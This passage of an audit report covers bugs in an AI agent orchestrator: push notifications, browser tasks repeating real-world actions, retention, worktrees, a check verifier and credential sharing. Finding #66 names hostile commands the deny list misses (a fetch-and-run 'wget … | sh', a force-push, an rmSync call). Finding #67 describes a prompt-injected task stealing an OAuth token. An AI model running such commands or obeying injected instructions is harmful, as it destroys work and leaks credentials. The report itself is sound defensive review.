- **What:** `notify` sends at most one push per tag per minute and silently drops the rest. The tag isn't a message
  identity. Every `waiting:` event shares the tag `waiting`, and each one is announced only once (`announced_auth` /
  `announced_mem`). A dropped push is never sent later, and a failed send (network error) still uses up the minute.
  Nothing limits pushes across tags, and every failing task has its own tag.
- **Failure:** Memory runs low 20 s after "Claude Code is not signed in" was pushed. The memory warning is dropped, and
  since `announced_mem` is now 1 it is never pushed. In the other direction, a broken origin or a bad merge fails 15
  queued tasks in a row, and the phone buzzes 15 times.
- **Fix:** Keep the newest dropped message per tag and send it when the minute is up. Add a global budget (e.g. 5 per
  10 min, then one "N more need you" summary).

### 55. [low] Pushes show approval targets and check output on the lock screen, and the badge counts reviews nobody can see (orchestrator.mjs:1060, :1367, :3307, :3392-3401)
- **What:** Push bodies are shown by iOS on the lock screen (and on a watch). They carry `#id title: <action>` for
  approvals, e.g. `send_email to bob@acme.com "Offer"`, and for failures, the first 200 chars of `detail`, which for
  `verification` is the command followed by its raw output (tests that print env or tokens). `badge` counts every
  `awaiting_review` task in every project. `armCheckpoints` also runs before the `paused_all` check and ignores project
  status. So a checkpoint in a paused project, or in one whose chat was deleted (`detachConvo`), still pushes "Review
  needed". It then keeps the badge at ≥ 1 in every later push, and no open chat shows the card.
- **Fix:** Use generic bodies ("Task #12 needs approval") with an opt-in for details, and never put check output in a
  push. Count and arm only checkpoints of active projects with a chat.

### 56. [low] A screen prompt for a machine that can't run it, or whose machine goes away, says "Waiting to start" forever (server.mjs:1618-1625; browser-view.mjs:188-194; orchestrator.mjs:3730-3744, :1518-1523, :2936-2940)
- **What:** `POST /api/browser/task` only checks that the node lists the profile, then pins the task there
  (`run_on: node`). `place()` gives a pinned browser task only to a worker that reports `browser.capable`, has the
  `approvals` feature and has `browser-task`. A worker that shows its profiles in the live view but lacks one of those
  (e.g. one that hasn't self-updated to `browser-task`) never matches. When the pinned worker drops mid-run, `job.lost`
  says "it moves to another machine", but the pin keeps it on that one. The task waits with no event, no notice and no
  timeout, and it holds a queue slot in `claimNext`'s first 25 rows.
- **Fix:** Refuse the POST (409 with the reason) unless `place` could ever pick that node. For a lost screen prompt,
  mark it failed with "the machine went away" (see #57) instead of waiting.

### 57. [med] A retried or lost screen prompt sends the original request again, so it can repeat actions that were already done (orchestrator.mjs:2720-2721, :2742, :2798, :3177-3182, :3197)
- **What:** Code tasks get `resumePrompt` or a handoff prompt on a retry. A browser task always gets `task.prompt`
  again, even when it resumes its own session. After a lost worker (`session_id: null`), it starts from scratch with no
  word about what the first run did. A max_turns or timeout retry resumes the session and repeats "Order the items in my
  cart" as a new user turn, and a lost run gets that request fresh on a profile where the order already went through.
  Only calls the classifier calls outbound reach the owner. Form fills, "Next" and "Confirm" steps that don't match a
  pattern run again unasked, and an owner shown a second "Place order" approval can easily take it for the first.
- **Fix:** On a resume, send "Continue the request; check the page for what is already done before acting again". On a
  lost or failed run, don't re-run by itself: mark it failed with the steps done so far (browserSteps) and let the
  owner re-send.

### 58. [low] `browserTaskStatus` calls successes failed and failures done (browser-task.mjs:9-14; orchestrator.mjs:3202-3206)
- **What:** Any "I couldn't / can't / was unable to" anywhere in the reply means `failed`. Any reply without one means
  `done`.
- **Repro (verified):** "I couldn't find a cheaper fare, so I booked the 9:40 flight as you asked." → failed. "Posted the
  reply. The first click showed "We were unable to complete your request", the retry worked." → failed. "I can't
  confirm the email arrived, but it was sent." → failed. "The site asks for a sign-in, so I stopped; nothing was
  submitted." → done. "Blocked by a CAPTCHA on the checkout page." → done.
- **Failure:** The Browser tab shows "Could not finish" for a flight that was booked, and the owner sends it again (a
  second booking). A blocked run shows "Done". Screen-prompt failures also skip `fail()`, so they never send a
  push.
- **Fix:** Trust only the status marker: ask for `AGENT-ORCH-STATUS: done|failed — …` on the last line and treat a
  missing marker as "unclear" (a third state shown as such). Route `failed` through `fail()`.

### 59. [low] Every browser tool call makes the server re-read every run log of up to 100 screen prompts (orchestrator.mjs:3746-3758, :1808; public/browser.js:456-463)
- **What:** Each `tool` entry broadcasts `olane`. Every open Browser tab that follows that profile then refetches
  `GET /api/browser/tasks` (500 ms debounce). The handler synchronously `readFileSync`+`parseJsonl`s every run log of
  the last 100 tasks on that profile, including done ones with Playwright snapshots in them. It builds every task's
  steps and sends them all, though the panel shows one task.
- **Failure:** After a few months of screen prompts on one profile, each click of a running task makes the 1-core
  controller parse tens of MB, about twice a second per open tab, and chats and the scheduler stall while a task runs.
- **Fix:** Return the list without steps, add `GET /api/browser/tasks/:id` for the shown task, and cache steps of
  finished tasks.

### 60. [med] Rapid top-up keeps reflecting every 3 minutes when queued work is blocked, and its quota guard rarely engages (orchestrator.mjs:2560-2564, :2583-2607, :363-367, :380-386)
- **What:** `ready` counts only runnable tasks, so work behind a failed prerequisite (failures don't cascade), in
  error backoff (`not_before`) or behind a checkpoint awaiting review counts as zero. `scheduleReflections` queues a
  reflection whenever `requested > 0` and the last one was created 180 s ago. Nothing backs off after a reflection that
  added nothing ready. The guard stops top-up only when every candidate agent has a cached 5 h reading ≥ 90% whose
  reset is still ahead. Claude's reading changes only when the owner presses refresh (Goal 7), it expires at the reset,
  and an agent with no reading at all never counts as limited. Rapid mode also drops the "if weekly capacity is tight,
  queue none" section from the reflection prompt, and `requested` is global, so every perpetual project is asked for
  the whole amount.
- **Failure:** Task A fails its check, and B, C and D are `after` A. Overnight, the project's reflection runs back to
  back. Each run sees A's failure, queues fixes `after` A or decides the owner must look first, and adds nothing ready.
  So it runs again 3 minutes later. With an owner review break held, rapid mode also keeps queueing and merging new
  work around the break all night. Both burn the 5 h window until the agent's hard limit hits.
- **Fix:** After a reflection that added no ready task, double the project's spacing (3 → 6 → 12 … 60 min) until
  `ready` grows. Don't top up past an `awaiting_review` checkpoint. Treat a 5 h reading older than its window as
  unknown-and-cautious (one reflection per 30 min) rather than free. Split `requested` across perpetual projects.

### 61. [med] Retention deletes approval screenshots after 7 days, even while the approval is still pending (retention.mjs:47-58; approvals.mjs:126-139; orchestrator.mjs:1367-1370)
- **What:** Media stays only if its id appears in `<DATA>/logs` or a surviving run log. A local run's approval
  screenshots are saved to the media store (`approvals.host` → `saveMedia`) and referenced only by the `approvals` table
  and `<DATA>/audit/<task>.jsonl`, which the GC doesn't scan. They survive only when `emitChat` also wrote the
  approval into a chat log. Screen prompts (the Browser project has no chat) and tasks of chat-less projects never
  get that. Remote approvals are safe: the worker's `image` event lands in the run log. Checkpoint `result` JSON
  (`taskShots`) isn't scanned either.
- **Repro (verified):** Use a temp data dir with `media/<sha>.png` (mtime 8 days old) and `audit/12.jsonl` containing
  `{"screenshot":"<sha>.png"}`. `gcRetention` → `{ media: 1 }`, and the file is gone.
- **Failure:** An approval's TTL can be up to 336 h. On day 8 the owner opens the card to decide and the screenshot is
  missing. After a week, every screen prompt's Actions timeline (the audit trail AGENTIC.md relies on) has broken
  images.
- **Fix:** Also scan `<DATA>/audit/` and the `approvals.screenshot` column (plus `tasks.result` of review tasks), or
  have approvals keep a reference list the GC reads.

### 62. [low] A symlinked worktrees root makes a reused worktree get deleted with its uncommitted work, and the task can never start again (worktrees.mjs:47-60, :86-90, :168-183)
- **What:** `git worktree add` records the real path. `worktreePath` joins `dirname(realpath(top))` with
  `.agent-orch-worktrees` without resolving that last part, so if the directory is a symlink (the owner moved it to a
  bigger disk) no listed worktree ever matches. `ensureWorktree` then sees "not listed", `registered()` doesn't
  include the path either, and it `rmSync`s the directory through the symlink. `pruneOrphanWorktrees` also deletes
  registered worktrees of every non-live task, and `cleanupWorktrees` skips them all.
- **Repro (verified):** Symlink `<parent>/.agent-orch-worktrees` → `<parent>/other`, `ensureWorktree(info, 7)`, and
  write `work.txt` in it. The second `ensureWorktree(info, 7)` deletes `work.txt` and then throws "is a missing but
  already registered worktree", on every later attempt too.
- **Fix:** `realpathSync` the worktrees root (create it first), or compare `realpath`s in `registered`/`listWorktrees`.

### 63. [low] Screen-prompt workspaces and their screenshots are never deleted, on the controller or on workers (orchestrator.mjs:2714-2715; worker.mjs:906, :1177-1178)
- **What:** Each screen prompt runs in `<orchestrator>/browser-tasks/<id>` (worker: `~/.agent-orch-worker/browser-tasks/<id>`)
  with Playwright's `outputDir` in `.agent-orch/shots/`. The controller never removes it, and neither retention nor the
  worktree sweeps look there. On a worker, `dropWorktree` returns right away when `job.cache` is unset, which is always
  the case for browser jobs, and `sweepLeftovers` only scans `worktrees/`. The images are already copied into the
  media store, so these are duplicates.
- **Fix:** Remove the workspace when a screen prompt reaches done/failed/cancelled (worker: in `dropWorktree`, before
  the `job.cache` check), and sweep `browser-tasks/` at boot for tasks that aren't live.

### 64. [med] Only the last command of a multi-line check block, or of a `;` snippet, decides pass or fail (taskrun.mjs:23-24, :31, :44)
- **What:** A fenced block is passed to `bash -c` whole. Newlines aren't counted as separators (only `;` and `&&` are),
  and bash returns the last command's status. A single snippet may hold one `;`, so the multi-snippet join wraps it as
  `{ a; b; }`, whose status is `b`'s alone.
- **Repro (verified):** A block with `node -e "process.exit(1)"` then `node -e "process.exit(0)"` gives
  `runCheck` → `[true, '(no output)', 0]`. `` `test -f /nonexistent; test -d /tmp` `` → passes. A block of `npm test`
  and `npm run lint` passes with failing tests.
- **Failure:** Work with failing tests is merged as "(check passed)". None of this repo's 262 specs uses a block or `;`
  (the planner learned to avoid them), but other projects' planners write fenced blocks naturally.
- **Fix:** Run checks with `set -e` semantics (`bash -e -o pipefail -c`), or join the lines of a block with ` && `,
  and join a `;` snippet's parts with `&&` too (a grep "prints nothing" suffix is the one intended `;`).

### 65. [med] A check that exits 127 with "command not found" counts as passing, and file names in backticks become commands (orchestrator.mjs:3237-3243; taskrun.mjs:15, :18)
- **What:** 127 with "command not found" means "program missing on this machine", and the task is accepted unverified.
  But the program is often the project's own. An npm script that calls a missing local binary exits 127 (`sh: jest:
  command not found`). And `looksLikeCommand` treats any snippet that starts with a runner name as a command, word
  boundary or not: `node_modules`, `nodes.json`, `bundle.js`, `go.mod`, `makefile`, `yarn.lock`, `./README.md`.
- **Repro (verified):** "Done when `node_modules` stays untracked and `npm test` passes" → `node_modules && npm test` →
  `[false, 'bash: node_modules: command not found', 127]`, so npm test never runs and the task is accepted. A
  package.json with `"test": "jestx"` → `npm test` → 127 `sh: jestx: command not found`, also accepted.
- **Failure:** A task that deletes a dev dependency, or whose Done-when first mentions a file name, is merged with
  its tests never run. The agent can also reach this state from inside its own worktree.
- **Fix:** Require a word boundary after RUNNERS entries (`node\b` but not `node_`/`nodes`), and skip snippets that
  look like paths with extensions. Accept 127 only when the missing program is the command's first word and is
  absent from PATH (`command -v`) before the check runs, never when a script inside it is missing.

### 66. [med] The Done-when filter drops real checks silently and still lets dangerous ones through (taskrun.mjs:17-18, :33, :43-45)
- **What:** A refused snippet throws away the whole check. The task then runs no check at all and is merged with a
  plain "done". Things that are refused: `>` anywhere, including `=>` inside a quoted grep pattern and `2>&1`; a third
  `&&`; env prefixes (`CI=1 npm test`) and `cd web && …` (not command-like, so a lone snippet leaves no check). The
  refusal list, meanwhile, misses: `git -C . push -f origin HEAD:main` (inside a fenced block), `|| true`, `&`,
  `$(…)`, `wget -qO- … | sh`, and `node -e "require('fs').rmSync(…)"`.
- **Repro (verified):** Today's `extractCommand` refuses the named command in 10 of this repo's 262 specs, and 9 of
  those are recorded as a plain `done`, without "(check passed)". They include #292 (2026-09-28, the fix for #37:
  `grep -q 'setMcpSource((agent, run) => ext.mcpRun(agent, run))' server.mjs`, refused for its `=>`), #34
  (`grep -q … && grep -q … && npm test`), and #33/#35/#36 (`npm test 2>&1 | grep …`). Some of these predate the
  current extractor, but #292 ran on it.
- **Fix:** Blank quoted text before the `>`/`rm`/`curl` tests (use `unquoted`), allow `2>&1` and `&&` chains, and
  accept env prefixes and a leading `cd <dir> &&`. When a snippet is refused, fail the task with "Done-when check was
  refused: …" (or ask the planner to restate it) instead of merging unchecked. Treat the deny list as a lint, not a
  sandbox: the verifier runs `node`/`npm`/`make` anyway, so the real limit is the run sandbox (#38).

### 67. [low] Shared sign-ins reach every process on a worker, "Stop sharing" doesn't revoke the token, and sharing Codex wipes a worker's own login (worker.mjs:434-452, :987; agent-share.mjs:57-66)
- **What:** The head's long-lived `sk-ant-oat01-…` token goes into the worker's `process.env`, so every child
  inherits it: `npm ci`/`npm install` lifecycle scripts of whatever repo a job clones, the Done-when check, and codex
  and any other agent's shell. "Stop sharing" only deletes the env var. The token stays valid for its year, in any
  process or file that already read it. Codex: `applyCredential` writes the head's `auth.json` over
  `~/.codex/auth.json` with no backup, even when the worker's owner signed Codex in there by hand with another ChatGPT
  account. When the head stops sharing, the file is deleted, so that machine's own `codex` is signed out.
- **Failure:** A repo's postinstall script (or a prompt-injected task on the Mac) reads `CLAUDE_CODE_OAUTH_TOKEN`, and
  it keeps working after the owner presses "Stop sharing". A MacBook whose owner uses Codex on a personal account
  silently becomes the head's account when paired, and loses its own login on unshare.
- **Fix:** Keep the token in a variable and pass it only in Claude runs' env (and strip it from install/check env). Say
  in the Connections UI that stopping doesn't revoke it (claude.ai → revoke). Before writing a shared Codex login,
  move a different-account `auth.json` to `auth.json.own` and restore it on unshare.

### Round 7 priorities
1. **#64, #65, #66 (the verifier).** Together they let broken work merge as verified or unchecked. #66 has already
   happened here: 9 real tasks were recorded as done with no check, #292 among them. They are small, testable changes in taskrun.mjs, and they
   gate every other fix.
2. **#57 and #58 (screen prompts repeating real-world actions).** Resume and lost-run prompts should not re-issue the
   request, and the status should come from a marker, not phrase matching.
3. **#60 (rapid runaway).** Add a backoff on empty top-ups and respect review breaks before rapid mode runs unwatched
   overnight.
4. **#61 (approval screenshots GC'd).** One extra scan dir and one DB column.
5. Then #53-#56 (push robustness and content, stuck screen prompts), #59 (Browser tab cost), #62-#63 (worktree root
   symlink, workspace leaks) and #67 (credential scope).
